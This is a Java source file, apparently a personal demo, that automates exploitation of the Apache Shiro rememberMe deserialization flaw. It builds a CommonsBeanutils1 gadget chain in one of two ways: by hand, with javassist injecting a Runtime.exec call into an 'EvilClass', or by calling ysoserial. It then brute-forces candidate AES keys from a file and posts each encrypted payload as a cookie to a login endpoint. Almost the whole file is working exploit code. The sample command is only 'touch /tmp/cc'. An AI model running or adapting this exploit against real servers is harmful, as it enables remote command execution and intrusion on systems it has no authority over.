package priv.ga0weI.demoshrio;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.util.PriorityQueue;
import java.util.Scanner;

/**
 * 自动化shiro攻击
 * @author ga0weI
 * @Time  2022/3/25
 */
public class Exploit {
    public static void main(String[] args) throws  Exception {


        String cmd = "touch /tmp/cc";
//            generateser(cmd);//generate serialize.ser
        generateserbyyso(cmd);//generate serialize.ser
        Thread.sleep(1000);
        String [] keys  = getKey();//拿到默认的key
        for (String key :keys ) {
            byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath( "ysopayload.ser"));//get encode payloads
            AesCipherService aes = new AesCipherService();
            if (key==null){
                return;
            }
            byte[] byteskey = Base64.decode(CodecSupport.toBytes(key));
            ByteSource rememberme = aes.encrypt(payloads, byteskey);
            String remembermestr = "rememberMe="+rememberme.toString();

            String response = HttpClientHelper.sendPost("http://192.168.129.130:8080/doLogin",remembermestr);
            System.out.println(key+"——————————————————————————测试的响应体是："+response);
            System.out.println("payload has bean send");
            System.out.println("payload :"+remembermestr);
        }


    }

    private static void generateserbyyso(String cmd) {
        String path = System.getProperty("user.dir");
        try {
            Runtime.getRuntime().exec("C:/Windows/System32/cmd.exe /c java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 \"" + cmd + "\" > ysopayload.ser", null, new File(path));
            System.out.println("————————————————利用yso生成payload成功————————————————————————————————————");
//            Runtime.getRuntime().exec("java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 \""+cmd+"\" > serr.ser",null,new File("D:\\githubprogram\\myShrio"));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    private static void generateser(String cmd) throws  Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
//            payload.makeClassInitializer().setBody("new java.io.IOException().printStackTrace();");
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\""+cmd+"\");");
        byte[] evilClass = payload.toBytecode();
        payload.defrost();

        // set field
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});
        setFieldValue(templates, "_name", "ga0weI");
        setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

        // 创建序列化对象
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(1);
        queue.add(1);

        // 修改值
        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        // 反序列化
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("serialize.ser"));
        out.writeObject(queue);
    }

    private static String[] getKey() throws Exception{
        FileInputStream fos = new FileInputStream("keys.txt");
        Scanner sc = new Scanner(fos);
        String [] keys = new String[300];
        int i = 0;
        while (sc.hasNext())
        {
            keys[i]= sc.nextLine();
            i=i+1;
        }
        return  keys;

    }
}
